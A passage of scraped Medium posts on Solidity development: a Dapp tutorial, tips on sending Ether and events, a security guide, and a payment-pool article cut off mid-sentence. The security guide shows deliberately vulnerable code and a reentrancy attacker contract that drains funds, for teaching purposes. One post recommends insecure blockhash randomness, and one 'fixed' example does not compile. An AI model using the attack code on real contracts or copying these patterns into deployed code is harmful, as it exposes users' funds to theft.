"https://medium.com/coinmonks/learn-solidity-shark-of-the-pool-part-1-ac0f733eecdd?source=search_post", "author_name": "Joze Kosmerl", "author_link": "https://medium.com/@jozhe", "publish_date": "2018-04-16", "last_modified_date": "2018-12-11", "readtime": "6.79", "claps": 308, "voters": 55, "content": "Learn Solidity. Shark of The Pool \u2014 Part 1Joze KosmerlFollowApr 16, 2018 \u00b7 7 min readImage sourceIn this series we will create a simple Dapp, based on Ethereum blockchain using Solidity smart contracts. In the later parts we will see how to test and deploy the contracts. We will also create React Web App and use MetaMask for blockchain transactions, to get a fully functional Dapp.Demo of the Dapp is available on this address.All source code is freely available in this GitHub repository.Join us at: SELECT Solidity development channelGoal of the DappI named this Dapp \u201cShark of The Pool\u201d, but what exactly does it do? Goal of the Dapp is pretty simple, I want to be able to create a pool in which people can contribute their precious Ether. Collection period is limited with a deadline, after which deposits to the pool aren\u2019t possible anymore.When the set deadline expires, we want to see who is the Shark of the pool, or the biggest contributor. Owner of that address, we will call him Shark, is the winner and can withdraw all the funds collected.Smart contractsLet\u2019s go right to the business. I will assume reader is not new to the Solidity, and can follow me through the development. Otherwise, Solidity documentation is your friend. Also I highly recommend using Truffle framework and a walk through their tutorials.Goal seems pretty simple, but when you start to think about it in terms of development, it may not be that straightforward. What we need is to separate logic into a few modules.Pool ContractPool will do exactly what we described earlier. Pool contract accepts deposits and safely stores them for the time of the collection period. After the deadline it rejects any further deposits and enables withdraw of funds for the Shark of the pool.Let\u2019s first define interface. Interfaces are important part of Solidity development. To learn more about why you should use them, I recommend this excellent post by Elena Dimitrova.pragma solidity ^0.4.21;contract iPool {    function () public payable;    function withdraw() public returns (bool success);}But didn\u2019t we forget deposit function you may ask? Deposit is a direct transaction to the contract. It\u2019s processed in the no name function. Don\u2019t forget the payable keyword, function modifier that allows functions to receive Ether. More on the topic by Sophie Wong.We want Deposit and Withdraw functions to have time constraints. For that we will create modifiers to the functions in the Timed contract. They get executed before the function they are modifying does, and are a great place to put function execution constraints.pragma solidity ^0.4.21;contract Timed {    uint256 public deadline;    modifier onlyWhileOpen {        require(block.timestamp <= deadline);        _;    }    modifier onlyWhileClosed {        require(block.timestamp > deadline);        _;    }}We are using some fancy stuff here, so let\u2019s explain:block.timestamp provides current block time in epoch secondsmodifier creates modifier to be used with functions_; after this statement, workflow of modified function continuesNow let\u2019s go to the Pool implementation part. First let\u2019s create constructorcontract Pool is iPool, Timed {    using SafeMath for uint256;    string public name;    address public token;    uint256 public rate;    function Pool(string _name, uint256 _rate, uint256 _deadline) public {        require(_rate > 0);        require(_deadline > block.timestamp);        name = _name;        rate = _rate;        deadline = _deadline;        token = new FishToken(_deadline);    }Constructor creates FishToken instance, which will be associated with this pool. FishToken will be used for deposit tracking and Shark selection.We have to make some checks upon calling constructor. Deadline has to be higher than current time and rate for award distribution has to be over 0.So let\u2019s see deposit functionfunction () public payable onlyWhileOpen {    require(msg.value > 0);    uint256 rewardTokens = rate.mul(msg.value);    require(iFishToken(token).issueTokens(msg.sender, rewardTokens));}So simple right? Literally all it does is calculate received tokens based on the set rate and triggers issue function on the FishToken contract. Now we can see how to apply function modifier. onlyWhileOpen modifier will be executed before function does, and will throw an error if time passes the deadline.And our Withdraw functionfunction withdraw() public onlyWhileClosed returns (bool success) {    if(iFishToken(token).isShark(msg.sender)) {       msg.sender.transfer(address(this).balance);        return true;    }    return false;}Withdraw function is modified by onlyWhileClosed modifier. It also performs check if sender wanting to withdraw is the real Shark. If yes, he gets all the Ether on the Pool contract. Lucky guy!That\u2019s it for the pool contract, it has more than enough logic and we don\u2019t want to further complicate things. Let\u2019s move on to the most complicated part, our FishToken contract.Fish Token ContractNow, we want to keep records of Ether contributions and determine the Shark. This is the most complicated part of the Dapp, so don\u2019t despair if logic is not clear right from the look at it. I\u2019ve used a standard token contract to begin with and made a lot of modifications to suit the needs of this Dapp.I named contract FishToken, since it keeps track of fishes in the pool and determines Shark amongst them.So let\u2019s define an interface for this contractcontract iFishToken {    function balanceOf(address _owner) public view returns (uint256 balance);    function transfer(address _to, uint256 _amount) public returns (bool success);    function issueTokens(address _beneficiary, uint256 _amount) public returns (bool success);    function getShark() public view returns (address sharkAddress, uint256 sharkBalance);    function isShark(address _address) public view returns (bool success);    /// @notice Event propagated on every executed transaction    event LogTransfer(address indexed _from, address indexed _to, uint256 _value);    /// @notice Event propagated when new deposit is made to the pool    event LogIssue(address indexed _member, uint256 _value);    /// @notice Event propagated when new address has the most tokens    event LogNewShark(address indexed _shark, uint256 _value);}I know, it\u2019s a lot. Let\u2019s go through it. First implementation of constructorcontract FishToken is iFishToken, Ownable, Timed {    using SafeMath for uint256;    uint8 public decimals;                //How many decimals to show    address public currentShark;    uint256 public totalSupply;    mapping(address => uint256) public balances;    mapping(address => bool) public participantsMap;    address[] public participantsArray;    function FishToken(uint256 _deadline) public {        deadline = _deadline;        totalSupply = 0;        currentShark = msg.sender;        owner = msg.sender;    }Functions balanceOf() and transfer() are similar to the classic token functions.function transfer(address _to, uint256 _value) public onlyWhileOpen returns (bool success) {    if (balances[msg.sender] < _value || balances[_to] + _value <= balances[_to]) {        return false;    }    addToParticipants(_to);    balances[msg.sender] = balances[msg.sender].sub(_value);    balances[_to] = balances[_to].add(_value);    emit LogTransfer(msg.sender, _to, _value);    determineNewShark();    return true;}function balanceOf(address _owner) public view returns (uint256 balance) {    return balances[_owner];}What they do is enable reward token transfers among participants and checking current balances. Transfer is modified with onlyWhileOpen modifier, meaning transfer is only possible for the collection period. That way users can aggregate received tokens if contributing from multiple addresses. Or give tokens to another person.We are using SafeMath library from zeppelin-solidity repository for math operations. Also we are emitting Log events when transaction occurs. Events are a great way to interact with your client side application. You can create listeners and listen for the emitted events on the contract. That way you get push event when something happens and don\u2019t need periodic queries on the contract.Functions addToParticipants() and determineNewShark(), are used for shark selection. We need to find new shark every time there is a change in token distribution.Next is the function issueTokens()function issueTokens(address _beneficiary, uint256 _amount) public onlyOwner onlyWhileOpen returns (bool success) {    if(balances[_beneficiary] + _amount <= balances[_beneficiary]) {        return false;    }    addToParticipants(_beneficiary);    balances[_beneficiary] = _amount.add(balances[_beneficiary]);    totalSupply = _amount.add(totalSupply);    emit LogIssue(_beneficiary, _amount);    determineNewShark();    return true;}Function issueToken() is triggered from the Pool contract. Since we create FishToken contract with the Pool contract, that contract becomes the owner. Modifying issueTokens() with onlyOwner modifier, makes is executed only when being called from the Pool contract, that created FishToken contract. That means only parent Pool contract can issue new tokens.For Ownable contract I used the one from zeppelin-solidity repository. They have a lot of contracts you can use in your own Dapps.Issuing tokens is pretty straightforward. We increase the balance of the address and totalSupply. Again we have to call functions addToParticipants() and determineNewShark(), since state of token distribution changed and we have to check if Shark changed.We also emit event LogIssue() which will help us with the client side application.Determine SharkThis functions reside in the FishToken contract. Basic idea for the algorithm is, to keep record of all addresses that could have tokens. This is done in participantsArray. To avoid double inserts into participantsArray, we also have participantsMap, which is set on true for the addresses, that are added to the array.To determine Shark, we simply loop through the participantsArray and set the one with most tokens as a Shark.mapping(address => bool) public participantsMap;address[] public participantsArray;function determineNewShark() internal {    address shark = participantsArray[0];    uint arrayLength = participantsArray.length;    for (uint i=1; i < arrayLength; i++) {        if (balances[shark] < balances[participantsArray[i]]) {            shark = participantsArray[i];        }    }    if(currentShark != shark) {        currentShark = shark;        emit LogNewShark(shark, balances[shark]);    }}function addToParticipants(address _address) internal returns (bool success) {    if(participantsMap[_address]) {        return false;    }    participantsMap[_address] = true;    participantsArray.push(_address);    return true;}These functions are set as internal, meaning they can only be triggered from another function within the contract, and not as a transaction on the contract.We have to determine new Shark whenever state of token distribution changes. Meaning we have to do recalculation for each transaction or issuing of tokens.ConclusionHere we go, we have created a fully functional Dapp, which tracks Ether contributions to the pool and determines Shark, the biggest contributor among them. We have enabled transfer of reward tokens between addresses, meaning you can participate with a friend, or using multiple addresses.Do you find any errors in my code? Do you see a way to optimize it? Please let me know, I would love to hear your feedback!Demo of the Dapp is available on this address.All source code is freely available in this GitHub repository.Parts of the series:Part 1 \u2014 Solidity smart contractsPart 2 \u2014 Testing Solidity DappPart 3 \u2014 Node.JS backend service for Solidity DappPart 4 \u2014 React Web App with MetaMask Web3", "responses": 1, "tags": ["Ethereum", "Dapps", "Solidity", "Tutorial", "Daaps Tutorial"]}, {"title": "3 Things I Learned This Week Using Solidity, Truffle, and Web3", "post_link": "https://medium.com/coinmonks/3-things-i-learned-this-week-using-solidity-truffle-and-web3-a911c3adc730?source=search_post", "author_name": "Thomas Shallenberger", "author_link": "https://medium.com/@valkn0t", "publish_date": "2017-06-25", "last_modified_date": "2018-12-10", "readtime": "2.59", "claps": 508, "voters": 53, "content": "3 Things I Learned This Week Using Solidity, Truffle, and Web3Thomas ShallenbergerFollowJun 25, 2017 \u00b7 3 min readEye-candy so you\u2019ll like my article \u2764As I began developing it became really hard to find answers to simple questions I had. Here, I lay out the questions I had and their answers.In this article, I cover these questions:How do I send Ether to a smart contract function?How do I generate a random number?How do I log events in a smart contract, and then read them as they occur?How do I send Ether to a smart contract function?There are some really good documentation on sending Ether to smart contracts, but it\u2019s gone through some iterations. Also, how you go about delivering funds to contracts depends on the medium you are using.If you are trying to send Ether to a smart contract via another smart contract, there is a really good write up of this process dated August 22, 2016 on the Ethereum Stack Exchange.If you are attempting to send Ether via web3, or a Truffle console, here\u2019s how I went about it:First, your smart contract must contain a payable function.This is an example of a constructor where you can initialize a smart contract with Ether:Solidity: function Contract() payable { }Here are some examples of payable functions in a smart contract:Solidity:function payableFunction() payable { }function payableFunction(uint randomVal) payable returns (bool) { }Here is how you call these functions from a web3 or Truffle console:truffle(development)> contract.payableFunction({from: address, value: etherAmount})truffle(development)> contract.payableFunction(randomVal, {from: address, value: etherAmount})What was stumping me was how I called the function to send Ether and pass it an arbitrary value as well. Turns out you pass your function parameters first, then a dictionary containing your from and value variables (which map to msg.sender and msg.value in Solidity).How do I generate a random number in a smart contract?Since the blockchain is deterministic, random numbers are practically impossible to create. Industrial strength solutions implemented in most gambling contracts where a lot of money relies on RNG typically rely on Oracles or ticket based solutions where multiple players submit a hash, and then all submissions are hashed and then revealed for a strong pseudorandomly generated number.I personally went the easy, one liner route, at least until my application evolves to handle more Ether:Solidity: // Generate a random number from 1-MAX_VALUE (MAX_VALUE is set // arbitrarily by the developer). uint random_number = uint(block.blockhash(block.number-1))% MAX_VALUE + 1;How do I handle events in a smart contract?Events are a notoriously tricky, convoluted subject in Ethereum development. I figured out how to handle an error condition as well as logging an event in the following manner.First, define an event in your Solidity smart contract:event Error(address indexed _sender, bytes32 error);the indexed keyword is important, as that\u2019s how we track events by the accounts who called the contract function.Here is how the event is called in the contract function:Error(msg.sender, \"ERROR_DETAILS_HERE\");Here is how we use web3 in the Truffle console to track events:truffle(development)> var errorEvent = contract.Error({_sender: web3.eth.coinbase})truffle(development)> errorEvent.watch(function(err, result){ console.log(result.args) })Then, when we call the function and an event is caused, our watcher can grab it, read it, and respond accordingly.Hope this helped! I\u2019m putting together a more comprehensive article on development, but will be releasing things that I learned along the way.If you liked this article, please recommend it and share it with your friends!Hit me up on Twitter: @valkn0t", "responses": 4, "tags": ["Ethereum", "Solidity", "Truffle", "Web3", "Tutorial"]}, {"title": "Security Considerations While Developing Ethereum Smart Contracts in Solidity", "post_link": "https://medium.com/altcoin-magazine/security-considerations-while-developing-ethereum-smart-contracts-in-solidity-aed8970341c3?source=search_post", "author_name": "Erin Godanci", "author_link": "https://medium.com/@erin.godanci", "publish_date": "2019-01-28", "last_modified_date": "2019-02-01", "readtime": "12.5", "claps": 424, "voters": 49, "content": "Security Considerations While Developing Ethereum Smart Contracts in SolidityBy Erin Godanci on ALTCOIN MAGAZINEErin GodanciFollowJan 28 \u00b7 13 min readIntroductionSmart contract security is a big issue that smart contracts face. Smart contracts ensure the security of the transactions are free from the risk of ambiguous interpretation of the conditions, as they are based on cryptography, but there are still problems that can\u2019t be solved with smart contracts. To develop smart contracts is certainly not a free picnic. A bug introduced in the smart contract code can cost money and most likely not only your money but also other people\u2019s as well. The reality is that the Ethereum ecosystem is still in its infancy but growing and standards are continuously being defined and redefined by the day so you need to always be updated about smart contract security features. This article provides a baseline knowledge of security considerations for intermediate Solidity developers.1. Compiler Version ConsiderationsWhen developing smart contracts it is always recommended to use a recent version of the Solidity compiler. Using an outdated version of the compiler on development can be problematic especially if there are publicly disclosed bugs and issues that affect the current compiler version. Make sure to always check for compiler warnings as they can flag the issue within a single contract.Usage of an outdated compiler example:pragma solidity 0.4.0; //outdated compiler versioncontract OutdatedCompiler{ uint x = 1;}Usage of an up to date compile example:pragma solidity 0.4.26; // updated compiler versioncontract UpdatedCompiler{ uint x = 1;}Contracts should always be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively. On smart contracts make sure to always lock the pragma version and also consider known bugs for the compiler version that is chosen.pragma solidity ^0.4.0; //unlocked compiler  \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 pragma solidity 0.4.25; //locked compiler2. Overflow and underflowAn overflow and underflow happen when an arithmetic operation reaches the maximum or minimum size of a type. For instance, if a number is stored in the uint8 type, it means that the number is stored in an 8 bits unsigned number ranging from 0 to 2^8\u20131. In computer programming an integer overflow/underflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits \u2014 either larger than the maximum or lower than the minimum representable value. It is recommended to use vetted safe math libraries such as \u201cSafeMath by OpenZeppelin\u201d library for arithmetic operations. consistently throughout the smart contract system.Overflow example: Let\u2019s say that in our contract he has a number type uint8, which can only have 8 bits. That means the largest number this can store is binary 11111111 (2^8\u20131=255).Let\u2019s take a look at the code below:uint8 number = 255;number++;In this example, we just caused an Overflow, so the number is now equal to 0. If we add 1 to binary 11111111, it will reset back to 00000000. So the number is now equal to 0.Underflow example: Let\u2019s say that in our contract we have a number type uint8 with the assigned value of 0 and we try to subtract this value by 1. What will happen?.Let\u2019s take a look at the code below:uint8 number = 0;number \u2014 ;In this example we just caused an underflow, so number is now equal to 255. If you subtract 1 to binary 00000000, the value will be set back to its maximum possible value which is 255 ( 2^8\u20131=255).As dangerous as both cases are, the underflow case is the more likely to happen, for example in the case where a token holder has X tokens but attempts to spend X+1. If the code does not check for it, the attacker might end up being allowed to spend more tokens than he had and have a maxed out balance value.3. Function VisibilityIn Solidity, functions can be specified as being external, public, internal or private.external functions: As a part of the contract interface, external functions can be called from other contracts and by transactions. Functions with external visibility cannot be accessed internally by other functions of the contract but only externally.public functions: function that are public, can be called both by message calls and internally. In the case of public state variables, they have automatic getter function generated for them.private functions: contract functions and state variables declared as private will only be visible within the contract that they have been declared on, and can not be accessed by any derived contract.internal functions: internal functions and state variables are only accessible internally from the contract that they are in, without using this and it allows contracts that inherit from the parent contract to use that function.Tips :Make sure to always keep your functions private or internal unless there is a need for outside interaction.External is cheaper to use because it uses the call data opcode while public needs to copy all the arguments to memory.While developing smart contracts in Solidity it is recommended to make a conscious decision on which visibility type is appropriate for that particular function. This can highly reduce the attack surface of a contract system. Choosing an inappropriate visibility for a function or a state variable can lead to a vulnerability if a developer did not set the appropriate visibility type and a malicious user then is able to make unauthorized or unintended state changes.Let\u2019s take a look at the vulnerable code below :function withdrawFunds() public { require(msg.sender == owner); transferFunds();}function transferFunds() public { // vulnerable function declared as public. msg.sender.transfer(balance);}Function transferFunds() visibility is set as public meaning that it can be called internally and by message calls. Any malicious user is able to call this function and transfer balance to its own address just by calling this function even if he\u2019s not the owner. In this case we need to use internal function visibility so the function can only be called internally.function transferFunds() internal { // function declared as internal. msg.sender.transfer(balance);}4. Unchecked return values from function callsWhen the return value of a message call is not checked, execution will resume even if the called contract throws an exception. If the call fails accidentally or an attacker forces the call to fail, this may cause unexpected behavior in the subsequent program logic. Always make sure to handle the possibility that the call will fail by checking the return value of that function.Let\u2019s take a look at the example code below:address contractB = 0x4c9D562226ad4fb5EEA1596e92c02A146BE01693function callNotChecked() public {  contractB.call(); // vulnerable }The code example above show us that the call() function for the contractB is not checked and if an unexpected error occurs that error is not handled, the execution will resume. If you choose to use low-level call methods like call(), make sure to handle the possibility that the call will fail by checking the return value. This method returns false if the subcall encounters an exception, otherwise it returns true. There is no notion of legal call, if it compiles, it\u2019s a valid contract. To handle call method we use the require() method to check for any unexpected error from the subcall.address contractB = 0x4c9D562226ad4fb5EEA1596e92c02A146BE01693function callChecked() public {  require(contractB.call()); //non-vulnerable }5. Reentrancy (Recursive Call Attack)One of the major risks of calling external contracts is that they can take over the control flow. In the reentrancy attack (a.k.a. recursive call attack) calling external contracts can take over the control flow, and make changes to your data that the calling function wasn\u2019t expecting. A reentrancy attack occurs when the attacker drains funds from the target contract by recursively calling the target\u2019s withdraw function.Let\u2019s take a look at the victims code below:mapping (address => uint) private userBalances;function withdraw() public { uint amountToWithdraw = userBalances[msg.sender]; require(msg.sender.call.value(amountToWithdraw)());userBalances[msg.sender] = 0; }When the contract fails to update its state (userBalances[msg.sender] = 0) prior to sending funds, the attacker can continuously call the withdraw function to drain funds from the contract. Anytime the attacker receives Ether, the attacker\u2019s contract automatically calls its fallback function(contract\u2019s function with no name that is automatically executed whenever the contract receives Ether and zero data), which is written to call the withdraw function again. At this point the attack has entered a recursive loop and the contract\u2019s funds start to pour to the attacker balance. Because the target contract gets stuck calling the attacker\u2019s fallback function, the contract is never able to update the attacker\u2019s balance to 0. The target contract is tricked into thinking that nothing is going wrong wrong.The recursive loop of a reentrancy attackIf we take a look at function withdraw() we can see that the victim\u2019s contract uses address.call.value() to send funds to the msg.sender address. The victims contracts updates the state of userBalances[msg.sender] which makes victims contract vulnerable. Using the privileges that those vulnerabilities give an attacker could use an external contract to liquidate all of the victims contract funds.Let\u2019s take a look at the attacker\u2019s code below :address owner;Victim v = Victim(0xae..); // Assigns Victims contract as \u201cv\u201d//assign contract creator as ownerconstructor (){ owner = msg.sender}//call withdraw function from the victims contractfunction getWithdraw()public{ v.withdraw();}//fallback function that withdraws funds from the victim\u2019s contractfunction () public payable {  v.withdraw(); }//send drained funds to attacker\u2019s address function drainFunds() payable public{  owner.transfer(address(this).balance());}The fallback function of this contract function(), calls the withdraw function of victim\u2019s contract ,to steal funds from the contract. On the other hand, function drainFunds() will be called at the end of the attack when the attacker wants to send all of the stolen funds to their own address. It should be clear now that reentrancy attacks take advantage of two particular smart contract vulnerabilities. The first being when victims contract state is updated after fund have been sent and not before. By failing to update the contract state prior to sending funds, the function can be interrupted mid-computation and the contract will be tricked into thinking the funds haven\u2019t actually been sent yet. The second vulnerability is when the contract incorrectly uses address.call.value() to send funds.To avoid reentrancy attacks on your contract :Update contract balance before sending funds the the msg.sender address.Use functions transfer() or send() when sending funds to an address instead of call.value() function because both transfer and send functions are limited to a stipend of 2.300 gas, enough to merely log an event and not multiple calls.When using low-level calls, make sure all internal state changes are performed before the call is executed.function withdraw() public { uint amountToWithdraw = userBalances[msg.sender];userBalances[msg.sender] = 0;  require(msg.sender.transfer(amountToWithdraw));}6. Uncontrolled Resource Consumption (Resource Exhaustion)Nowadays, more and more Dapps and instruments utilize blockchain technology and Ethereum smart contracts development. The more complex that the business logic behind the smart contract is, the more gas it requires to deploy it to the network. This is due to the fact that when the size of the contract code increases, the size of the contract\u2019s bytecode also increases as well. Uploading a large amount of bytecode in the network requires a lot of gas. At this time, in Ethereum blockchainthere is a limitation of about 8 million gas limit per block. This means that the total amount of gas for all the transactions in a block also including contract deploy cannot exceed this number. As everyone in the Ethereum community knows, Gas is a necessary resource for the execution of smart contracts and transactions. If too little gas is specified, transaction may not get picked up by miners for further processing in a timely manner or die in the middle of processing. It is important to tune and optimize smart contract in order to minimize the amount of gas required.When smart contracts are deployed or the functions inside them are called, the execution of these actions always requires a certain amount of gas, based of how much computation is needed to process and complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block can not exceed that limit. Programming patterns that are harmless in centralized applications can lead to DoS(Denial of Service) conditions in smart contracts when the cost of executing a function exceeds the block gas limit. For example modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition. Actions that require looping across the entire data structure should be consider to be avoided. If you absolutely have to loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions.Reduce resource consumption by implementing the methods below:Libraries \u2014 a library can be used to reduce the bytecode size of the contract, meaning that less gas will be used for the deployment of that contract. A library is uploaded to the Ethereum network just once, and it can be used by several contracts that require this functionality. We can also move a various functions from the contract to the library in order to reuse the code efficiently.Using signatures to call functions \u2014 use call method to send message calls to other contracts. An advantage of this approach it that a smart contract does not have to store the bytecode of the called method. As a result, the compiled smart contract will not have any extra opcodes, that in in turn will reduce its size. Notice that is is not possible to get the return value of the function when the call command is used. And don\u2019t forget to use require for handling error purposes.Interfaces \u2014 the same result can be achieved by means of interface. In Solidity an interface is a special type of contract, limited to what the contract ABI can represent. With the use of interfaces in our smart contracts the code readability improves, and also the return values are handled.7. Multiple External CallsExternal calls can sometimes fail accidentally or deliberately, which can cause a Denial Of Service condition in the smart contract. To minimize the damage caused by such failures, it is always better to isolate each external call into its own transaction that can be initiated by the recipient of the call. This is especially relevant for payments, where it is better to let users withdraw funds from the contract rather than pushing funds to them automatically (this also reduces the chance of problems with the gas limit).It is recommended to follow call best practices:Try avoiding combining multiple external calls in a single transaction, especially when calls are executed as part of a loop.Always assume that external calls can fail.Implement the contract logic to handle failed calls.Avoid combining multiple calls in a single transaction, especially when calls are executed as part of a loop and always assume that external calls can fail. It is recommended to implement the contract logic that will handle failed calls.\u201cAvoid external calls when possible. Calls to untrusted contracts can introduce several unexpected risks or errors. External calls may execute malicious code in that contract or any other contract that it depends upon. As such, every external call should be treated as a potential security risk, and removed if possible.\u201d \u2014 Ethereum Wiki8. Diamond ProblemSolidity supports multiple inheritance, meaning that one contract can inherit several contracts. Multiple inheritance introduces ambiguity called Diamond Problem: if two or more base contracts define the same function, which one should be called in the child contract? Solidity deals with this ambiguity by using reverse C3 Linearization(an algorithm used primarily to obtain the order in which methods should be inherited in the presence of multiple inheritance), which sets a priority between base contracts. That way, base contracts have different priorities, so the order of inheritance matters. Neglecting inheritance order can lead to unexpected behavior. When inheriting multiple contracts, especially if they have identical functions, a developer should carefully specify inheritance in the correct order. The rule of thumb is to inherit contracts from more /general/ to more /specific/.9. Transaction Ordering AssumptionsAfter submission transactions enter a pool of unconfirmed transactions and maybe included in blocks by miners in any order, depending on the miner\u2019s transaction selection criteria, which is probably some algorithm focused for achieving maximum earnings from transaction fees. The order of transactions being included can be completely different to the order in which they are generated, therefore smart contract code cannot make any assumptions on transaction order.Apart from unexpected results in contract execution, there is a possible attack vector in this, as transactions are visible in the mempool(Memory Pool) and their execution can be predicted. This maybe an issue in trading currencies , where delaying a transaction may be used for personal advantage by a rogue miner. In facet, simply being aware of certain transactions before they are executed can be used as advantage by anyone, not just miners.ConclusionBefore starting to develop your smart contract, realize that there are already great developers in the community who have probably already developed and tested secure code something similar to what you\u2019re trying to do in your own project so consider using some of their code. Don\u2019t forget that the Ethereum Virtual Machine is still infancy and we are learning new things about EVM and Solidity every day, so always stay up to date on the best practices for Ethereum development and any new updates to the Ethereum ecosystem.Referenceshttps://medium.com/coinmonks/smart-contract-security-essentials-160b179b84cfhttps://smartcontractsecurity.github.io/SWC-registry/https://solidity.readthedocs.io/en/latest/security-considerations.htmlhttps://medium.com/cryptronics/ethereum-smart-contract-security-73b0ede73fa8https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-1-c33048d4d17dhttps://consensys.github.io/smart-contract-best-practices/known_attacks/https://hackernoon.com/smart-contract-attacks-part-1-3-attacks-we-should-all-learn-from-the-dao-909ae4483f0aFollow us on Twitter, InvestFeed, Facebook, Instagram, LinkedIn, and join our Discord and Telegram.Altcoin Magazine is a popular destination for cryptocurrency enthusiasts and blockchain researchers. We strive to become the largest, most accessible and easy to read a magazine full of news, articles, videos, and podcasts and will be the go-to place for monitoring of coins, crypto companies, projects, products, events, advisors and much, much more.Read about our upcoming Altcoin Magazine Mastermind Event here.", "responses": 1, "tags": ["Ethereum", "Blockchain", "Security", "Smart Contracts", "Development"]}, {"title": "Scalable Payment Pools in Solidity", "post_link": "https://medium.com/cardstack/scalable-payment-pools-in-solidity-d97e45fc7c5c?source=search_post", "author_name": "Hassan Abdel-Rahman", "author_link": "https://medium.com/@habdelra", "publish_date": "2018-01-30", "last_modified_date": "2018-08-29", "readtime": "12.0", "claps": 836, "voters": 47, "content": "Scalable Payment Pools in SolidityPaying a lot of people without paying a lot of gasHassan Abdel-RahmanFollowJan 30, 2018 \u00b7 13 min readAn interesting problem I\u2019ve been working on lately: payment pools. For those new to my blog, I\u2019m an Ethereum developer at Cardstack, and I routinely post about fun challenges we are solving.At Cardstack we are building an application framework for decentralized applications (dApps) that puts user experience first. A key to that is building out our Tally Protocol, which we feel is going to revolutionize the scalability of the blockchain.One of the aspects of Tally is building a mechanism to distribute token payments and royalties from application users to application owners and software developers, as well as to reward analytic miners that contribute GPU cycles to calculate the payments and royalties for each payment cycle.The means by which analytic miners determine the allocation of tokens, reach consensus of the solution, and write the solution on-chain will be described in another really fascinating up-coming post \u2014 stay tuned!For now, I\u2019m going to focus more upon the disbursements of the payments from the payment pool.Payment pools are a general mechanism that can be used to model a one-to-many or many-to-many payment channel. The idea is that tokens can be deposited into a pool from various sources, and then based on \u201crules\u201d\u2014implemented on-chain or off-chain\u2014the tokens in the pool can be disbursed to many recipients. Essentially, our approach has the ability to aggregate large numbers of micro-payments into a single settlement, saving a lot of gas.Consider a Spotify-like scenario, where royalties are paid to musicians each time someone listens to a song. A streaming service could fund a payment pool for their musicians with a large sum of tokens. Then as people stream music, those streaming usage logs are aggregated over each payment cycle, and the aggregated payment amounts are fed to the payment pool to disburse the royalties among the musicians in a way that uses less gas than if an on-chain transaction was issued for each time someone listened to a song.First Take: Array-Based Payment PoolOur initial conception of this on-chain payment pool smart contract was pretty straightforward.The idea was that the payment pool smart contract would receive ERC-20 tokens from various token collection smart contracts, and analytic miners would determine the allocation of tokens within the payment pool by analyzing signed application usage logs and other on-chain signals of application usage. The analytic miners would reach a consensus on payout amounts from the payment pool and submit the payout to the payment pool as an array of payees\u2019 addresses and an array of their payment amounts which would be written into a ledger that the payment pool administers.The most obvious drawback to this solution is the fact the payment pool is dealing with an unbounded array of payees and their payment amounts, meaning this kind of transaction could run into the block gas limit. That would require the payment pool function to monitor its gas budget while keeping track of its progress through the list of payees, so that it could pick up where it left off in a subsequent transaction if it exceeded its gas budget.We did a little experimentation, and we were able to iterate though around 200 payees before we exceeded our gas budget when the transaction was using the block gas limit as the gas limit for the transaction. At today\u2019s ETH exchange rate, with a gas prices of 30 gwei and a block gas limit of around 8,000,000, that means about $260 USD in gas fees in order to process a payee list of around 200 recipients. Basically we would be paying a little more than $1/payee in gas fees.Clearly, this approach does not scale. Back to the drawing board\u2026Enter: Merkle TreesIn our search for a better approach, we became inspired by this Ethereum research post.The idea is that instead of having the payment pool administrate a ledger of the payees and their payment amounts, we could build a Merkle tree that holds the payees and their payment amounts, and have the payees withdraw their payment amounts by having them submit the Merkle proof for their particular payment. The Merkle proof then becomes a key that only works for the payee that unlocks the payee\u2019s tokens within the payment pool.The beauty of the Merkle tree approach is that we only need to write a 32 byte Merkle root to the payment pool, and that there is no upper boundary on the number of payees that can live in the Merkle tree. Regardless of how many payees are represented by the Merkle tree we only ever need to write a 32 byte Merkle root for the tree: the gas fees can be reasonably measured in pennies for an unbounded number of payees.As many of us know: a Merkle tree is a novel binary tree structure that allows us to easily and cheaply confirm if a node actually exists in the tree. Merkle trees form the substrate upon with Ethereum is built, and facilitate the ability for an Ethereum node to validate blocks without needing the full history of the blockchain.The most important aspects of Merkle trees are that:Each node is the hash of the sum of the node\u2019s childrens\u2019 hashesThe root node contains a hash that is effected by every single node in the treeWe can confirm if a node exists in the tree by adding together the hash of a node and its \u201cgreat-aunts & uncles\u201d to see if they match the root node.By Azaghal (Own work) [CC0], via Wikimedia CommonsEffectively, we put the data that we care about in the leaf nodes of the Merkle tree. There are many code libraries available that can do this, where you supply the library with an array, and the library will sort the array, and build the Merkle tree structure with the supplied sorted array forming the leaf nodes of the Merkle tree. The library can provide the root of the Merkle tree as well as provide the proof for any node, where the proof is a list of the node\u2019s hashed great-aunts & uncles that when added up with the hash of the node will equal the Merkle root.The way that we can verify a node actually exists in a Merkle tree is to add the node with its proof and see if that result is equal to the root node. It turns out there is actually a Solidity library to do exactly this (thanks to Open Zeppelin)!In this example, we can confirm that L2 exists in the tree by adding hash(L2) to the hash A and the hash B and confirm that the hash of the sum is the root node\u2019s hash.Merkle Tree Payment PoolOkay, so how can we leverage a Merkle tree in our payment pool?This approach leverages an approach that requires both on-chain and off-chain mechanisms. In order to generate the Merkle tree, we can use an off-chain process (e.g. NodeJS module) to construct a Merkle tree from a list of payees and their payment amounts. In this approach, each node is a string concatenation of the payee\u2019s address and their payment amount.Consider the following payee list:We can convert this list to an array that looks like this:Then we can build a Merkle tree from this list, and the contract owner can submit the Merkle root to the payment pool contract. As well as, we can publish the leaf nodes and their proofs in a place where payees can get access to this data (e.g. IPFS).So that a list that looks like this is made available:(note that these are not the actual Merkle proofs for these nodes, but some random hex to convey the idea)A payee could then invoke a function on the payment pool contract with the amount and proof as the parameters of the function in order to withdraw their tokens.The idea is that the paymentPool.withdraw() function would reconstruct the leaf node from the msg.sender and the token amount. The withdraw function could then hash that leaf node and add the 